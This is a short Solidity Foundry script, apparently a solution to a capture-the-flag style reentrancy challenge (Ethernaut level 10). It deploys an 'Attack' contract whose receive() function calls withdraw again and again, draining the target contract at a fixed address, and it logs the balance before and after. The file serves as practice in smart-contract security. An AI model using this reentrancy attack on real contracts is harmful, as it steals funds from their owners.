// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrancy-10.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    Reentrance public reentrance = Reentrance(payable(0x2e577c019fCCEF0961D8966fEdC799d19f961393));

    constructor() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        reentrance.withdraw(0.001 ether);
    }
}

contract ReentrancySolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Old Balance", address(0x2e577c019fCCEF0961D8966fEdC799d19f961393).balance);
        Attack attack = new Attack{value: 0.001 ether}();
        attack.withdraw();
        console.log("New Balance", address(0x2e577c019fCCEF0961D8966fEdC799d19f961393).balance);
        vm.stopBroadcast();
    }
}
